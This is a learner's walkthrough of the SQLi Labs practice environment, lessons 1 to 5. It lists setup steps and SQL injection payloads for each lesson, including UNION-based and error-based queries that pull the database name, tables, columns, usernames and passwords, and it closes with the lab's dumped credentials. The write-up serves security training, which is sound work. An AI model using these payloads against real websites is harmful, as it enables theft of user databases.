#**SQLi Labs**

First we have to set up sqli labs
For that we can use the following commands
install apache2 webserver by > sudo apt install apache2
install mysql by > sudo apt-get install mysql-srver
install php7
git clone the repository of the lab and start all the services.

#LESS1
The website says,Please input the ID as parameter with numeric value.
So we can input ?id=1 or 2,3,4,5.....
when we put ' we get sql error 
thus we have a sql injection
we can comment ou the rest of the query by -- - or other comments in sql language.
We can dump contents

 payloads to dump
 We can get version of the server by using /?id=-1' union select 1,version(),3--+
 We can get databasename of the server by using /?id=-1' union select 1,database(),3--+  databasename = security
 Going to the terminal and going to mysql. If we type show databases; it shows databases
 Then we can security also. We can find more details using "use security we can go into the database.
 Using show tables; we can see the tables. For looking into the tables desc emails; and so on...
 
#LESS2
The website says,Please input the ID as parameter with numeric value.
This time when we input use ?id=1'-- - doesn't work.
So we put ' before the 1 and change it as ?id='1' as payload.
Now we can comment it ?id='1' -- - 
Now we can dump contents using the payloads.

#payloads to dump
to find column_name ?id='-1' union select 1,group_concat(column_name),3 from information_schema.columns where table_name='users'--+
We have more payloads that can we do and get contents of database

#LESS3
The website says,Please input the ID as parameter with numeric value.
This time when we input use ?id=1'-- - nor ?id='1'-- - doesn't work.
So we put ) before the ' and change it as ?id=1)' as payload.
No we can comment it ?id=1)'-- -
Now we can dump contents using payloads

#payloads to dump
to find data /?id=-1') union select 1,group_concat(username),3 from users
We have more payloads that can we do and get contents of database

#LESS4
The website says,Please input the ID as parameter with numeric value.
We have to use ') ' as payload 
Now can comment it using ?id=1' ")-- -
Now we can dump contents using payloads

#payloads to dump 
?id=-1' ")-- - union select 1,group_concat(username),group_concat(password) from users
We have more payloads that can we do and get contents of database.

#LESS5
In this challenge we don't get any response form the databse directy to the browser
but we get the error when we break the query,so we can dump the database through the error
we can use rand(),floor(),count() to get error

#payloads to dump
this will get database /?id=1' AND (select 1 from(select count(*),concat((select database()),floor(rand()*2))a from information_schema.tables group by a)b)--+
to get table names /?id=1' AND (select 1 from(select count(*),concat((select table_name from information_schema.tables where table_schema=database() limit 0,1),floor(rand()*2))a from information_schema.tables group by a)b)--+
to get columns /?id=1' AND (select 1 from(select count(*),concat((select column_name from information_schema.columns where table_name='emails' limit 0,1),floor(rand()*2))a from information_schema.tables group by a)b)--+

#contents of database
1.databasename = security
2.tables = emails,referers,uagents,users
3.columns = CURRENT_CONNECTIONS,TOTAL_CONNECTIONS,USER,id,password,username
4.usernames = Dumb,Angelina,Dummy,secure,stupid,superman,batman,admin,admin1,admin2,admin3,dhakkan,admin4
password = Dumb,I-kill-you,p@ssword,crappy,stupidity,genious,mob!le,admin,admin1,admin2,admin3,dumbo,admin4
